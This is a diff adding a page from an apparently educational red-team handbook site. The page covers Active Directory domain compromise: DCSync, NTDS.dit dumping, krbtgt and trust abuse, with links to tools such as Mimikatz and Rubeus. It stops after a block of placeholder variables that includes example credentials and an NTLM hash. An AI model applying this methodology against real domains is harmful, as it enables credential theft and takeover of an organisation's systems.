@@ -1,0 +1,2906 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/AD/Domain_Compromise/">
+      
+      
+        <link rel="prev" href="../Priv_Escalation/">
+      
+      
+        <link rel="next" href="../Persistance/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Domain Compromise - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#domain-compromise" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Domain Compromise
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unauth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Auth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Credential_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberos_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NTLM_Relay_and_Coercion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ACL_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lateral_Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Priv_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcshadow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCShadow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#domain-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Domain Admin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enterprise-admin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enterprise Admin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Abuse
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#child-to-parent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Child to Parent
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sid-history" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SID History
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#krbtgt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        KRBTGT
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ntds-dumping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NTDS Dumping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#domain-compromise-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Domain Compromise Checklist
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Persistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Forest_and_Trusts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross Forest & Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Toolset/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toolset
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="domain-compromise">Domain Compromise</h1>
+<p>Domain compromise means gaining control over domain-level authentication, replication, privileged groups, domain controllers, trust relationships, or key material such as <code>krbtgt</code>.</p>
+<p>This is the highest-impact stage in an Active Directory assessment.</p>
+<p>Typical domain compromise indicators:</p>
+<ul>
+<li>ability to DCSync</li>
+<li>ability to dump <code>NTDS.dit</code></li>
+<li>control over a Domain Admin or equivalent account</li>
+<li>control over <code>krbtgt</code></li>
+<li>control over a domain controller</li>
+<li>ability to forge valid Kerberos tickets</li>
+<li>ability to compromise parent or trusted domains</li>
+<li>ability to abuse inter-domain or inter-forest trusts</li>
+</ul>
+<p>Useful resources:</p>
+<ul>
+<li><a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync">The Hacker Recipes - DCSync</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden">The Hacker Recipes - Golden Ticket</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/trusts/">The Hacker Recipes - Trusts</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds">The Hacker Recipes - Dumping NTDS.dit</a></li>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks - Active Directory Methodology</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket</a></li>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+<li><a href="https://wadcoms.github.io/">WADComs</a></li>
+</ul>
+<p>Basic variables used in examples:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NETBIOS</span><span class="o">=</span>CORP
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>alice
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password123!&#39;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NTLM</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_IP</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_HOST</span><span class="o">=</span>dc01.corp.local
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN_DN</span><span class="o">=</span><span class="s1">&#39;DC=corp,DC=local&#39;</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN_SID</span><span class="o">=</span><span class="s1">&#39;S-1-5-21-1111111111-2222222222-3333333333&#39;</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PARENT_DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="nb">export</span><span class="w"> </span><span class="nv">CHILD_DOMAIN</span><span class="o">=</span>dev.corp.local
